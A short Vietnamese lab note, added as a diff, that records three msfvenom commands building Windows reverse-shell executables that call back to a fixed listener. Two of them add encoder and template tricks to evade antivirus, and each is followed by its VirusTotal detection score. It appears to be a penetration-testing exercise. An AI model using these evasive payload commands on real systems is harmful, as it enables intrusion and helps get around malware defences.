@@ -1,0 +1,13 @@
+Tạo virus và upload lên portal virustotal.com
+
+Câu lệnh chưa bypass:
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.27.160 LPORT=4444 -f exe -o shell.exe
+Kết quả sau khi upload virustotal là: 47/64 
+
+Câu lệnh bypass-1:
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.27.160 LPORT=4444 -f exe -e x86/shikata_ga_nai -o shell2.exe
+Kết quả sau khi upload virustotal là: 47/63
+
+Câu lệnh bypass-2:
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.27.160 LPORT=4444 -f exe -e x86/shikata_ga_nai -x /usr/share/windows-binaries/nc.exe -o shell3.exe 
+Kết quả sau khi upload virustotal là: 40/65
